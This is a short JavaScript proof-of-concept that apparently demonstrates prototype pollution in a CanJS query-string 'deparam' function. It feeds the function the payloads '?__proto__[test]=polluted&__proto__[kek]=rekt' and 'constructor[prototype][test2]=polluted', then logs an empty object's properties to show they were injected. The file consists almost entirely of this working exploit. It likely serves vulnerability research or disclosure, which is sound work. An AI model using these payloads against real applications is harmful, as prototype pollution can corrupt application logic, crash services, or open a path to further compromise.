import * as query from './canjs-deparam-ed.js';
console.log({}.test);
console.log({}.test2);
console.log(query.deparam('?__proto__[test]=polluted&__proto__[kek]=rekt'));
console.log(query.deparam('constructor[prototype][test2]=polluted'));
console.log({}.test);
console.log({}.kek);
console.log({}.test2);
